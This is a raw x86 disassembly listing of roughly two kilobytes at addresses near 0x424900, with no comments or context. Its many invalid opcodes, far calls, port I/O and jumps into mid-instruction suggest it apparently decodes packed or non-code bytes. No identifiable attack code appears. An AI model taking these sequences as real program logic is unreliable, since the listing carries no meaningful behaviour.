  4248d4:	add    BYTE PTR ds:0x87f32127,bh
  4248da:	pop    ss
  4248db:	es addr16 into 
  4248de:	loope  0x4248a1
  4248e0:	lea    ebp,[ebp+0x25e499be]
  4248e6:	mov    bh,BYTE PTR fs:[ecx+0x4a5d53e0]
  4248ed:	aas    
  4248ee:	retf   0xf600
  4248f1:	xchg   edi,eax
  4248f2:	aad    0x14
  4248f4:	push   ebx
  4248f5:	mov    ebx,0x2a63b225
  4248fa:	sbb    bh,ch
  4248fc:	ret    0x85ec
  4248ff:	call   0x6cff:0xf4bcde72
  424906:	mov    ds,WORD PTR [edx]
  424908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424909:	xchg   edi,eax
  42490a:	sub    cl,BYTE PTR [ebx-0x7a]
  42490d:	popf   
  42490e:	sbb    DWORD PTR [edi+0x6b992713],ebx
  424914:	dec    edi
  424915:	cdq    
  424916:	jmp    0x4248bb
  424918:	fcom   QWORD PTR [edi-0x1011eadf]
  42491e:	inc    ecx
  42491f:	jl     0x424936
  424921:	ret    0xaa6f
  424924:	nop
  424925:	add    esp,ebp
  424927:	inc    edi
  424928:	cmp    al,0x39
  42492a:	in     al,0x50
  42492c:	mov    DWORD PTR [eax+0x13b44737],edx
  424932:	mov    eax,ds:0xcfb5927e
  424937:	or     BYTE PTR [ebp+0x75b5b29c],dh
  42493d:	cmp    DWORD PTR [esi+0x77852301],edi
  424943:	pop    esi
  424944:	jnp    0x424976
  424946:	pop    eax
  424947:	call   0xe645:0xb17639f2
  42494e:	sti    
  42494f:	mov    cl,0xa7
  424951:	rol    BYTE PTR [ecx+0x71],cl
  424954:	stos   DWORD PTR es:[edi],eax
  424955:	ror    DWORD PTR [eax-0x1e],0xe5
  424959:	pop    edx
  42495a:	les    edi,FWORD PTR [ebx-0x296b1da6]
  424960:	sti    
  424961:	mov    ch,0xbb
  424963:	xchg   edx,eax
  424964:	aas    
  424965:	push   ebx
  424966:	les    eax,FWORD PTR [ecx+0x54]
  424969:	(bad)  
  42496a:	inc    ecx
  42496b:	icebp  
  42496c:	mov    dh,0x61
  42496e:	sti    
  42496f:	and    eax,0xf68bbc7f
  424974:	mov    ds:0xa4414424,al
  424979:	cdq    
  42497a:	data16 sub ch,BYTE PTR [ebx+0x6bc0f71d]
  424981:	inc    eax
  424982:	jl     0x4249c6
  424984:	dec    eax
  424985:	fidiv  DWORD PTR [ecx]
  424987:	or     cl,dl
  424989:	ss add eax,ebp
  42498c:	cs and eax,0x91d7c2a6
  424992:	jbe    0x4249a2
  424994:	and    eax,0x6a77f043
  424999:	jne    0x424982
  42499b:	adc    eax,0xc4074871
  4249a0:	inc    esi
  4249a1:	loope  0x42494f
  4249a3:	add    cl,dl
  4249a5:	loope  0x42499e
  4249a7:	or     ecx,ebp
  4249a9:	rcr    bh,0xf0
  4249ac:	test   al,0xb4
  4249ae:	mov    ebx,0xf724a20e
  4249b3:	and    ebp,ebx
  4249b5:	sbb    ebp,DWORD PTR [eax-0x3ab318fa]
  4249bb:	sub    DWORD PTR [ebx+0x239c832f],ebp
  4249c1:	mov    ebx,0xda0f4ac6
  4249c6:	aam    0xbb
  4249c8:	pop    edi
  4249c9:	dec    esp
  4249ca:	loope  0x42497b
  4249cc:	fisttp WORD PTR [edx-0x62]
  4249cf:	icebp  
  4249d0:	jbe    0x4249d5
  4249d2:	add    DWORD PTR [eax+0x1e],esp
  4249d5:	mov    eax,ds:0xd2429727
  4249da:	scas   al,BYTE PTR es:[edi]
  4249db:	leave  
  4249dc:	push   cs
  4249dd:	sti    
  4249de:	mov    cl,0xe
  4249e0:	xor    DWORD PTR [ecx-0x4a],0xffffffbd
  4249e4:	or     al,0x1d
  4249e6:	(bad)  
  4249e7:	aas    
  4249e8:	sbb    BYTE PTR [ebx-0x63a697de],bl
  4249ee:	push   ebx
  4249ef:	add    al,0x81
  4249f1:	outs   dx,BYTE PTR ds:[esi]
  4249f2:	rol    BYTE PTR [edi+0x6eb35844],1
  4249f8:	pop    ecx
  4249f9:	pop    ebp
  4249fa:	lds    ecx,FWORD PTR [ecx+ecx*4+0x52]
  4249fe:	lods   al,BYTE PTR ds:[esi]
  4249ff:	xchg   DWORD PTR [eax-0x9],ebx
  424a02:	dec    esi
  424a03:	jno    0x424a4f
  424a05:	mov    ah,0x91
  424a07:	push   ebx
  424a08:	lods   al,BYTE PTR ds:[esi]
  424a09:	mov    DWORD PTR [ebx-0xb17d7dd],ebx
  424a0f:	shl    BYTE PTR [ebp+0x5e],0xb9
  424a13:	gs inc edi
  424a15:	mov    edi,0x8337cf05
  424a1a:	mov    ecx,0xd9d66622
  424a1f:	je     0x424a86
  424a21:	mov    ah,0xd3
  424a23:	xchg   BYTE PTR [edi],ch
  424a25:	and    eax,0xb49366ef
  424a2a:	xchg   edx,eax
  424a2b:	jno    0x424a54
  424a2d:	adc    BYTE PTR [ebx+0x634f2bd0],bl
  424a33:	and    esi,DWORD PTR [eax+0x38cf2823]
  424a39:	call   0x4099:0xdb8e10dd
  424a40:	inc    edi
  424a41:	cmp    DWORD PTR [esp+eiz*2],eax
  424a44:	pop    ds
  424a45:	cmp    BYTE PTR [esi+ebx*8],al
  424a48:	jmp    0x424a30
  424a4a:	std    
  424a4b:	cmp    ebp,DWORD PTR [edi-0x4a1ae9ee]
  424a51:	sbb    eax,0x4fab68c1
  424a56:	imul   edx,DWORD PTR [ebp+0x18],0xfffffff6
  424a5a:	dec    edi
  424a5b:	in     al,0x3f
  424a5d:	or     dh,BYTE PTR [ebx-0x6f27e2df]
  424a63:	pushf  
  424a64:	add    BYTE PTR [eax],al
  424a66:	add    BYTE PTR [eax],al
  424a68:	add    BYTE PTR [eax],al
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	fldenv [edi+edi*4-0x6c]
  424a7a:	ins    BYTE PTR es:[edi],dx
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [edx-0xfffffa],al
  424a83:	(bad)  
  424a84:	aaa    
  424a85:	dec    ebx
  424a86:	or     eax,0x25f22db
  424a8b:	(bad)  
  424a8c:	stos   BYTE PTR es:[edi],al
  424a8d:	sbb    dh,BYTE PTR [eax-0x40]
  424a90:	loop   0x424a5d
  424a92:	sub    DWORD PTR [ecx+0x72278250],0xc994f818
  424a9c:	fcomp  st(5)
  424a9e:	sub    DWORD PTR [esi+0x1cc7a393],ecx
  424aa4:	scas   al,BYTE PTR es:[edi]
  424aa5:	jo     0x424ad5
  424aa7:	es lock mov dl,0x90
  424aab:	mov    esi,0x73d7bf9d
  424ab0:	cmp    eax,0xe24c0071
  424ab5:	in     eax,0x55
  424ab7:	jge    0x424b13
  424ab9:	in     al,dx
  424aba:	cdq    
  424abb:	cld    
  424abc:	cmp    ah,BYTE PTR fs:[ecx]
  424abf:	lea    ecx,[esi]
  424ac1:	mov    edx,0x82eaf95b
  424ac6:	add    eax,0x79eed1d2
  424acb:	jecxz  0x424b23
  424acd:	clc    
  424ace:	fwait
  424acf:	stos   DWORD PTR es:[edi],eax
  424ad0:	arpl   WORD PTR [ebx+0x2b],cx
  424ad3:	sbb    cl,BYTE PTR [ebx-0x48f3dd7d]
  424ad9:	(bad)  
  424ada:	xlat   BYTE PTR ds:[ebx]
  424adb:	test   DWORD PTR [esi-0x19238c27],ebp
  424ae1:	sub    DWORD PTR [esi],ebp
  424ae3:	arpl   WORD PTR [edi+esi*8+0x24b62a75],di
  424aea:	jno    0x424b24
  424aec:	mov    edx,0x110829c2
  424af1:	mov    al,0xc5
  424af3:	aaa    
  424af4:	mov    ds,WORD PTR [ebx]
  424af6:	pop    esp
  424af7:	or     ebx,DWORD PTR [edi+edi*2-0xe]
  424afb:	add    eax,0x81eef81e
  424b00:	xchg   DWORD PTR [ecx],edi
  424b02:	add    DWORD PTR [edi],eax
  424b04:	into   
  424b05:	cmp    DWORD PTR [ecx+0x3],edx
  424b08:	fadd   DWORD PTR [esi+0x5321774b]
  424b0e:	xchg   ebx,eax
  424b0f:	loopne 0x424b79
  424b11:	inc    esp
  424b12:	daa    
  424b13:	xor    eax,0xa11a0795
  424b18:	jno    0x424b6b
  424b1a:	pop    ecx
  424b1b:	retf   0xcfc2
  424b1e:	mov    DWORD PTR [esi],0xd4e6b93e
  424b24:	pop    eax
  424b25:	and    BYTE PTR [ecx],dh
  424b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b28:	push   ebp
  424b29:	or     bh,BYTE PTR [esi-0x19]
  424b2c:	xchg   edi,eax
  424b2d:	cmp    BYTE PTR [ecx+0x6f7f7a58],ch
  424b33:	add    DWORD PTR [eax+eiz*1+0xc],edi
  424b37:	mov    ecx,0x288784c7
  424b3c:	cmp    al,0xe7
  424b3f:	mov    edi,0x63a0e7fa
  424b44:	add    ebx,DWORD PTR [ebx-0x4989c0bc]
  424b4a:	xchg   ecx,eax
  424b4b:	inc    ecx
  424b4c:	add    eax,esp
  424b4e:	scas   al,BYTE PTR es:[edi]
  424b4f:	jge    0x424bb0
  424b51:	(bad)  
  424b52:	jno    0x424bb7
  424b54:	into   
  424b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b56:	(bad)  
  424b57:	xchg   esi,eax
  424b58:	push   0xcf1b420d
  424b5d:	push   es
  424b5e:	test   ebp,ebp
  424b60:	les    esp,FWORD PTR [edx-0x5e]
  424b63:	jno    0x424b0d
  424b65:	call   0x212e2c46
  424b6a:	outs   dx,BYTE PTR ds:[esi]
  424b6b:	pushf  
  424b6c:	je     0x424b98
  424b6e:	pop    edi
  424b6f:	push   esi
  424b70:	mov    ah,0xd8
  424b72:	mov    esi,0x49ba0ae7
  424b77:	loope  0x424b72
  424b79:	push   edi
  424b7a:	popf   
  424b7b:	fbstp  TBYTE PTR ds:0x906266e1
  424b81:	das    
  424b82:	(bad)  
  424b83:	sub    dh,BYTE PTR [edi+edx*4+0xebfe74b]
  424b8a:	or     esp,DWORD PTR [ecx+0x568cf27c]
  424b90:	jmp    0xd0c0:0x240fe88
  424b97:	and    ch,BYTE PTR [esi+ecx*2]
  424b9a:	sbb    edi,esp
  424b9c:	fisttp WORD PTR [eax+eax*4-0x28889299]
  424ba3:	mov    BYTE PTR [ebx+0x1f],al
  424ba6:	mov    ah,0x8c
  424ba8:	jecxz  0x424c17
  424baa:	push   es
  424bab:	push   0x18
  424bad:	and    ecx,edx
  424baf:	out    dx,eax
  424bb0:	cmp    eax,0x9b669c88
  424bb5:	jle    0x424be7
  424bb7:	push   0xffffffd4
  424bb9:	icebp  
  424bba:	adc    eax,ebp
  424bbc:	mov    edi,DWORD PTR [bx+0x22]
  424bc0:	fwait
  424bc1:	xchg   ebp,eax
  424bc2:	jl     0x424b72
  424bc4:	ret    
  424bc5:	jl     0x424bbd
  424bc7:	ror    DWORD PTR ds:0x3f2c5795,1
  424bcd:	stc    
  424bce:	(bad)  
  424bcf:	(bad)  
  424bd0:	out    0x20,eax
  424bd2:	test   eax,0x76e1276b
  424bd7:	jo     0x424bae
  424bd9:	jns    0x424c45
  424bdb:	mov    ch,0xbd
  424bdd:	sub    DWORD PTR [edx],esi
  424bdf:	outs   dx,DWORD PTR ds:[esi]
  424be0:	mov    esi,0x50b35698
  424be5:	adc    eax,0x73d43cfb
  424bea:	xor    eax,0x76
  424bed:	in     al,0x10
  424bef:	dec    ebx
  424bf0:	cmp    DWORD PTR [edi-0x6c],esi
  424bf3:	mov    DWORD PTR [eax+0x76],esp
  424bf6:	loope  0x424c0f
  424bf8:	aam    0xe
  424bfa:	xor    eax,ebp
  424bfc:	dec    ecx
  424bfd:	and    ah,BYTE PTR [esi]
  424bff:	push   edi
  424c00:	dec    esi
  424c01:	adc    esi,esp
  424c03:	rcl    BYTE PTR [edx+0x4d],cl
  424c06:	push   ecx
  424c07:	popf   
  424c08:	inc    esp
  424c09:	mov    dl,0x13
  424c0b:	arpl   WORD PTR [edi],di
  424c0d:	xor    al,BYTE PTR [ebx]
  424c0f:	inc    edx
  424c10:	mov    eax,ds:0x7718c785
  424c15:	call   0x5566356d
  424c1a:	inc    eax
  424c1b:	shr    DWORD PTR [ecx],1
  424c1d:	inc    edx
  424c1e:	(bad)  
  424c1f:	push   edx
  424c20:	jnp    0x424c11
  424c22:	int3   
  424c23:	mov    dh,0x4a
  424c25:	lods   eax,DWORD PTR ds:[esi]
  424c26:	out    dx,eax
  424c27:	retf   0x2377
  424c2a:	repnz or eax,0xa664f721
  424c30:	sub    dh,BYTE PTR [ecx-0x62308087]
  424c36:	out    0x5d,eax
  424c38:	lea    esp,[ebx]
  424c3a:	mov    bh,dh
  424c3c:	dec    esp
  424c3d:	or     dh,dh
  424c3f:	and    al,0xaa
  424c41:	inc    eax
  424c42:	dec    esp
  424c43:	jns    0x424c5c
  424c45:	pop    esi
  424c46:	adc    BYTE PTR [edi],ch
  424c48:	or     eax,0xeb8b1539
  424c4d:	mov    ?,ebx
  424c4f:	mov    bl,0x4
  424c51:	fiadd  WORD PTR [ebx+0x2100c745]
  424c57:	sub    dl,al
  424c59:	sti    
  424c5a:	aad    0x5b
  424c5c:	mov    esp,0xcc82c4a4
  424c61:	xchg   edi,eax
  424c62:	cwde   
  424c63:	jle    0x424ce3
  424c65:	xchg   ecx,eax
  424c66:	push   esp
  424c67:	push   ds
  424c68:	js     0x424c42
  424c6a:	mov    cl,0xc7
  424c6c:	push   es
  424c6d:	shl    bh,cl
  424c6f:	push   ebp
  424c70:	ins    BYTE PTR es:[edi],dx
  424c71:	sub    BYTE PTR [ecx],dl
  424c73:	inc    ecx
  424c74:	scas   eax,DWORD PTR es:[edi]
  424c75:	icebp  
  424c76:	out    0x1a,eax
  424c78:	pushf  
  424c79:	movntq QWORD PTR [ebx+edx*1+0x1ab91356],mm6
  424c81:	mov    fs,WORD PTR [ebp-0x7]
  424c84:	xor    al,BYTE PTR [ebx-0x1]
  424c87:	or     al,ch
  424c89:	sub    BYTE PTR [ecx+esi*1+0x673354ad],ah
  424c90:	lods   al,BYTE PTR ds:[esi]
  424c91:	ins    DWORD PTR es:[edi],dx
  424c92:	rol    BYTE PTR [eax-0x25],cl
  424c95:	push   ebx
  424c96:	enter  0x3add,0x60
  424c9a:	pushf  
  424c9b:	in     eax,dx
  424c9c:	imul   edi,eax,0x6eb0a687
  424ca2:	push   esp
  424ca3:	je     0x424c66
  424ca5:	nop
  424ca6:	cmc    
  424ca7:	cwde   
  424ca8:	inc    ebp
  424ca9:	push   esi
  424caa:	and    BYTE PTR [bp+si-0x4c],al
  424cae:	call   0xa94a88ed
  424cb3:	out    0x16,eax
  424cb5:	(bad)  
  424cb6:	test   eax,0xe0c66f91
  424cbb:	sti    
  424cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424cbd:	dec    eax
  424cbe:	xor    DWORD PTR [ebx],edx
  424cc0:	sbb    DWORD PTR [edi+0x3ff91240],ecx
  424cc6:	clc    
  424cc7:	cmp    eax,0x8119c9d2
  424ccc:	jge    0x424cf6
  424cce:	(bad)  [ebx+0x35c4faa2]
  424cd4:	adc    ebx,DWORD PTR [ecx]
  424cd6:	sub    eax,0xcc2c8927
  424cdb:	adc    al,0xa9
  424cdd:	add    eax,0x269b4f47
  424ce2:	in     al,0xeb
  424ce4:	mov    cl,0xc
  424ce6:	in     eax,0x10
  424ce8:	sbb    esp,DWORD PTR [edx]
  424cea:	jge    0x424cc2
  424cec:	repz push 0xffffffd6
  424cef:	dec    edi
  424cf0:	add    BYTE PTR [ecx-0x22],cl
  424cf3:	ins    DWORD PTR es:[edi],dx
  424cf4:	lods   al,BYTE PTR ds:[esi]
  424cf5:	(bad)  [eax]
  424cf7:	mov    dh,0xa4
  424cf9:	jbe    0x424cdb
  424cfb:	inc    ebx
  424cfc:	jmp    0xd52c:0x24db5d36
  424d03:	iret   
  424d04:	iret   
  424d05:	pop    ds
  424d06:	pop    eax
  424d07:	fs daa 
  424d09:	sbb    esi,ecx
  424d0b:	inc    ebp
  424d0c:	jmp    0x868ad26b
  424d11:	mov    ecx,0xaeeb8035
  424d16:	cmp    eax,0xca4016dc
  424d1b:	inc    edx
  424d1c:	adc    eax,0x239452e9
  424d21:	xchg   edi,eax
  424d22:	push   ds
  424d23:	pop    ds
  424d24:	and    DWORD PTR [ebp+0x45cc76c0],eax
  424d2a:	mov    ecx,0xca21fe34
  424d2f:	mov    ah,0x77
  424d31:	(bad)  
  424d32:	fadd   DWORD PTR [esi]
  424d34:	ret    0xfda9
  424d37:	mov    ah,0x4f
  424d39:	pop    esi
  424d3a:	(bad)  
  424d3b:	cli    
  424d3c:	sbb    al,BYTE PTR [ebp-0x34]
  424d3f:	jmp    0x9a5638b6
  424d44:	jg     0x424d4d
  424d46:	in     eax,0x1b
  424d48:	adc    DWORD PTR [eax-0x1fa1d0c5],edi
  424d4e:	add    BYTE PTR ds:0x2a457fe1,bh
  424d54:	jne    0x424d73
  424d56:	xor    ecx,DWORD PTR [ebx+0x6880504b]
  424d5c:	mov    esi,0x17798a32
  424d61:	add    al,0x9f
  424d63:	mov    ds:0xaab0c022,eax
  424d68:	imul   eax
  424d6a:	adc    BYTE PTR [edi],bh
  424d6c:	fdiv   DWORD PTR [edi-0x2c]
  424d6f:	mov    ebp,DWORD PTR [ebx-0x7e]
  424d72:	push   ebx
  424d73:	call   0x3f78:0x8ddbcb03
  424d7a:	push   es
  424d7b:	loope  0x424d9f
  424d7d:	daa    
  424d7e:	push   edi
  424d7f:	dec    eax
  424d80:	jecxz  0x424df9
  424d82:	pop    ss
  424d83:	fwait
  424d84:	popf   
  424d85:	pop    esi
  424d86:	fdiv   QWORD PTR [edx-0x15670351]
  424d8c:	jno    0x424d6b
  424d8e:	cli    
  424d8f:	xor    bl,ch
  424d91:	xchg   DWORD PTR [esi+esi*8-0x40f268a0],eax
  424d98:	mov    bh,0xe7
  424d9a:	inc    esi
  424d9b:	push   ebp
  424d9c:	aam    0x5e
  424d9e:	push   edx
  424d9f:	sub    dl,dh
  424da1:	mov    esp,0xc07caff4
  424da6:	jmp    0xa49552ea
  424dab:	(bad)  
  424dac:	call   0xf3ce:0x419e1be8
  424db3:	cmp    DWORD PTR [ebp-0x4025cea1],edx
  424db9:	cmp    esi,DWORD PTR [eax]
  424dbb:	adc    eax,0x7f5515b0
  424dc0:	adc    eax,0x18af955d
  424dc5:	popa   
  424dc6:	popf   
  424dc7:	pushf  
  424dc8:	mov    al,ds:0x415bfbe9
  424dcd:	out    dx,eax
  424dce:	push   ecx
  424dcf:	cmp    eax,0x8564d321
  424dd4:	sub    DWORD PTR [edi-0x65ba3d47],esp
  424dda:	ins    BYTE PTR es:[edi],dx
  424ddb:	ret    0xf96e
  424dde:	lock fcom DWORD PTR [esi+0x49d81647]
  424de5:	retf   0xb489
  424de8:	xchg   edx,eax
  424de9:	nop
  424dea:	les    ecx,FWORD PTR [edi]
  424dec:	test   eax,0xc01daa12
  424df1:	out    0x76,al
  424df3:	cwde   
  424df4:	add    BYTE PTR [ecx-0x18],dh
  424df7:	push   ecx
  424df8:	ins    DWORD PTR es:[edi],dx
  424df9:	or     BYTE PTR [eax],0x4c
  424dfc:	(bad)  
  424dfd:	test   al,0x8d
  424dff:	mov    eax,0x5791c48c
  424e04:	data16 test BYTE PTR [ecx+eax*2+0x2e],al
  424e09:	dec    ecx
  424e0a:	dec    ebp
  424e0b:	lods   eax,DWORD PTR ds:[esi]
  424e0c:	cs stos DWORD PTR es:[edi],eax
  424e0e:	mov    DWORD PTR [eax+0x1a36bcd1],edx
  424e14:	jl     0x424e35
  424e16:	bound  edi,QWORD PTR [ecx+0x5a07f9c4]
  424e1c:	adc    di,WORD PTR [esi-0x381613dd]
  424e23:	xlat   BYTE PTR ds:[ebx]
  424e24:	jmp    0x424e29
  424e26:	mov    ebx,0xfd7e9776
  424e2b:	jle    0x424deb
  424e2d:	dec    ebx
  424e2e:	mov    cl,0xcd
  424e30:	sub    al,0x26
  424e32:	ret    
  424e33:	fadd   DWORD PTR [ecx]
  424e35:	and    DWORD PTR gs:[edx],0xffffffe2
  424e39:	(bad)  
  424e3a:	les    eax,FWORD PTR [edi]
  424e3c:	stos   BYTE PTR es:[edi],al
  424e3d:	xor    dh,BYTE PTR [ebx]
  424e3f:	fwait
  424e40:	or     ebx,DWORD PTR [ecx-0x74]
  424e43:	push   ebp
  424e44:	mov    edi,0x7be1f897
  424e49:	and    DWORD PTR [edi+0x6c],0xffffff95
  424e4d:	xchg   edi,eax
  424e4e:	idiv   bl
  424e50:	(bad)
  424e53:	adc    ah,ah
  424e55:	fs jnp 0x424e5c
  424e58:	dec    eax
  424e59:	dec    edx
  424e5a:	fadd   QWORD PTR ds:0x3594fb5
  424e60:	mov    ds:0xfedeb8fe,eax
  424e65:	jmp    0x424e6d
  424e67:	xchg   esp,eax
  424e68:	cmp    ch,dl
  424e6a:	rcl    DWORD PTR [edi-0x3d39c2a9],1
  424e70:	mov    dl,0xeb
  424e72:	(bad)  [ecx+0x44]
  424e75:	mov    edx,0x362a6774
  424e7a:	mov    ebx,0xee87c094
  424e7f:	xlat   BYTE PTR ds:[ebx]
  424e80:	pop    ecx
  424e81:	jg     0x424ecc
  424e83:	lahf   
  424e84:	in     al,dx
  424e85:	push   0x902b7ab9
  424e8a:	mov    ds:0xe1cb2718,al
  424e8f:	sub    esp,ecx
  424e91:	ins    DWORD PTR es:[edi],dx
  424e92:	loope  0x424e41
  424e94:	push   esp
  424e95:	in     eax,0x8
  424e97:	and    ecx,DWORD PTR [eax+0x3e5a981e]
  424e9d:	adc    BYTE PTR [eax],cl
  424e9f:	xor    DWORD PTR [ebp-0x56e60d6d],0x7bbc19a4
  424ea9:	mov    DWORD PTR [edi+0x154bc792],ecx
  424eaf:	jnp    0x424ebd
  424eb1:	sub    eax,0xbb46ff87
  424eb6:	sbb    al,0x1b
  424eb8:	sub    BYTE PTR [edi+edi*2],bh
  424ebb:	adc    al,0x5e
  424ebd:	push   edi
  424ebe:	xchg   esp,eax
  424ebf:	adc    eax,0x6c8f295a
  424ec4:	outs   dx,DWORD PTR ds:[esi]
  424ec5:	es out 0x63,eax
  424ec8:	pop    ss
  424ec9:	inc    esi
  424eca:	push   DWORD PTR [edx-0x26]
  424ecd:	push   es
  424ece:	es inc esi
  424ed0:	mov    edi,0x652d1ce6
  424ed5:	xor    DWORD PTR [ebp+0x7f9c9f5c],0xcc4b9094
  424edf:	push   0x50
  424ee1:	test   BYTE PTR [ecx+0x7c],bh
  424ee4:	scas   al,BYTE PTR es:[edi]
  424ee5:	sub    ebp,DWORD PTR [ecx+0x77]
  424ee8:	lahf   
  424ee9:	and    ch,BYTE PTR es:[eax-0x2]
  424eed:	enter  0x65b0,0x4c
  424ef1:	mov    al,ds:0xc2d2f79c
  424ef6:	mov    edx,0x9434a625
  424efb:	push   esi
  424efc:	les    edx,FWORD PTR [edi+0x78437383]
  424f02:	mov    bl,0x67
  424f04:	dec    eax
  424f05:	adc    DWORD PTR [esi-0x75],edx
  424f08:	mov    ecx,0x4ab925c7
  424f0d:	xor    al,0xdd
  424f0f:	pop    ebp
  424f10:	fnstsw WORD PTR [ecx-0x1f]
  424f13:	mov    ebx,0x3a38e7c4
  424f18:	repnz xchg ebp,eax
  424f1a:	jne    0x424f87
  424f1c:	or     eax,0x2986aa40
  424f21:	mov    bl,0x66
  424f23:	or     dh,BYTE PTR ds:0xb64cbb1a
  424f29:	sbb    bh,ah
  424f2b:	push   ss
  424f2c:	icebp  
  424f2d:	add    BYTE PTR [ecx+0x656d6d71],dl
  424f33:	loop   0x424f28
  424f35:	arpl   WORD PTR [ecx+0x15],bp
  424f38:	pop    eax
  424f39:	std    
  424f3a:	sar    edx,1
  424f3c:	sub    al,0xaa
  424f3e:	aas    
  424f3f:	push   esp
  424f40:	jecxz  0x424ed5
  424f42:	adc    DWORD PTR [edi+0x62183a9c],0xffffff8d
  424f49:	mov    al,ds:0xabb1ac1c
  424f4e:	cmp    BYTE PTR [ebp+0x7f],dl
  424f51:	les    ebx,FWORD PTR [ecx+0x1cf7e598]
  424f57:	adc    BYTE PTR [edi+0xe],dl
  424f5a:	adc    ecx,DWORD PTR [ebp+0x5c6d7b30]
  424f60:	pop    eax
  424f61:	adc    BYTE PTR [esi+0x59155d94],dl
  424f67:	je     0x424f67
  424f69:	sar    BYTE PTR [eax+ecx*8],0xd5
  424f6d:	jecxz  0x424fc2
  424f6f:	jge    0x424f40
  424f71:	mov    ah,0xe9
  424f73:	sbb    BYTE PTR [edx-0x35609de8],0xe9
  424f7a:	out    0x9a,al
  424f7c:	popf   
  424f7d:	push   eax
  424f7e:	rol    esi,0x97
  424f81:	pushf  
  424f82:	add    eax,0xabbdc11d
  424f87:	rol    DWORD PTR [eax+0x1a],cl
  424f8a:	cs scas al,BYTE PTR es:[edi]
  424f8c:	fdiv   QWORD PTR [ebx]
  424f8e:	add    eax,DWORD PTR [eax+0x2c]
  424f91:	bound  ebp,QWORD PTR [ebp+0x78]
  424f94:	retf   0x35be
  424f97:	push   cs
  424f98:	scas   al,BYTE PTR es:[edi]
  424f99:	jno    0x424f77
  424f9b:	sub    esi,DWORD PTR [esi-0x64]
  424f9e:	lds    eax,FWORD PTR ds:0xcb3fc702
  424fa4:	aam    0xf6
  424fa6:	(bad)
  424fa9:	sub    eax,0x2a9cb8ac
  424fae:	xchg   edx,eax
  424faf:	pushf  
  424fb0:	sar    DWORD PTR [ebp+eax*8+0x3ec73c0d],0x4
  424fb8:	jmp    0x1fa476fd
  424fbd:	lea    edx,[ebx+0x7d]
  424fc0:	nop
  424fc1:	sub    DWORD PTR [ebx],edx
  424fc3:	add    al,0x9a
  424fc5:	sub    al,0x64
  424fc7:	shl    DWORD PTR [ebx+0x7f],0xb0
  424fcb:	mov    ds,WORD PTR [ebx]
  424fcd:	scas   al,BYTE PTR es:[edi]
  424fce:	add    eax,0x603f667b
  424fd3:	(bad)  
  424fd4:	das    
  424fd5:	shl    BYTE PTR [esi],cl
  424fd7:	mov    ds:0x1d921383,eax
  424fdc:	or     BYTE PTR [eax+0x2c],ah
  424fdf:	mov    fs,WORD PTR [ebx]
  424fe1:	mov    cl,0xfb
  424fe3:	push   cs
  424fe4:	test   al,0x40
  424fe6:	or     al,BYTE PTR [ebx-0x71df0b3d]
  424fec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424fed:	sbb    DWORD PTR [ecx+0x234519d],ebx
  424ff3:	pop    esp
  424ff4:	pop    ds
  424ff5:	addr16 in al,dx
  424ff7:	add    ch,dh
  424ff9:	les    edi,FWORD PTR ds:0x4d4e56c6
  424fff:	enter  0xa9a,0x62
  425003:	(bad)  
  425004:	xchg   esp,eax
  425005:	jmp    0x4fff:0x172256ee
  42500c:	idiv   BYTE PTR [ebp+0x11]
  42500f:	mov    bl,0x3f
  425011:	inc    esp
  425012:	mov    DWORD PTR [eax],ecx
  425014:	div    BYTE PTR [ebp-0x134c3bc8]
  42501a:	push   edi
  42501b:	(bad)  
  42501c:	pop    eax
  42501d:	iret   
  42501e:	dec    ebp
  42501f:	push   esp
  425020:	sar    eax,1
  425022:	and    dl,BYTE PTR [eax]
  425024:	call   0x4ce3:0x447bc301
  42502b:	ss leave 
  42502d:	daa    
  42502e:	or     BYTE PTR [ebx+0x5],dl
  425031:	cld    
  425032:	add    dl,dh
  425034:	fucomp st(5)
  425036:	jp     0x424fde
  425038:	rcr    BYTE PTR cs:[esi],1
  42503b:	mov    cl,0xbb
  42503d:	push   ds
  42503e:	mov    bl,BYTE PTR [esi+eiz*1-0x5295d7f0]
  425045:	or     BYTE PTR [edx+edx*2],ah
  425048:	fs pop eax
  42504a:	cmp    eax,0xa860ad0b
  42504f:	psrlq  mm2,mm7
  425052:	mov    bh,0x6
  425054:	mov    ecx,0x9d09f1c3
  425059:	mov    di,0x274d
  42505d:	xchg   esp,eax
  42505e:	idiv   bl
  425060:	and    al,0xe8
  425062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425063:	in     al,dx
  425064:	shr    DWORD PTR [esi+ebp*2],1
  425067:	pop    esi
  425068:	sub    bh,BYTE PTR [edx+0x27bc94af]
  42506e:	add    eax,ecx
  425070:	push   edi
  425071:	jle    0x42506e
  425073:	and    BYTE PTR [ecx+ebp*4-0x479bd3c5],ah
  42507a:	inc    ebp
  42507b:	popa   
  42507c:	mov    al,ds:0x4ad6f323
  425081:	(bad)  
  425082:	cmp    DWORD PTR [eax-0x3c],edx
  425085:	and    eax,0x4cf981f6
  42508a:	inc    eax
  42508b:	int3   
  42508c:	repnz (bad) 
  42508e:	lock mov al,ds:0x37a78965
  425094:	xchg   ebp,eax
  425095:	xlat   BYTE PTR ds:[ebx]
  425096:	mov    ds:0xce985a11,al
  42509b:	retf   
  42509c:	xor    DWORD PTR [edx-0x55],0x924c6d57
  4250a3:	ret    
  4250a4:	and    BYTE PTR [ebx],cl
  4250a6:	call   0x1da1d40
  4250ab:	adc    esi,DWORD PTR [eax]
  4250ad:	xchg   esp,eax
  4250ae:	in     al,0xfe
  4250b0:	mov    dl,BYTE PTR ds:0x4a1247ec
  4250b6:	pop    edx
  4250b7:	pop    ebp
  4250b8:	inc    edi
  4250b9:	pop    edi
  4250ba:	mov    al,0x2a
  4250bc:	pop    ecx
  4250bd:	and    al,0xab
  4250bf:	jno    0x425099
  4250c1:	and    ebp,DWORD PTR [eax+ecx*4+0x630b464e]
  4250c8:	push   0xffffffa9
  4250ca:	imul   eax,DWORD PTR [ecx],0x7d
  4250cd:	repnz aaa 
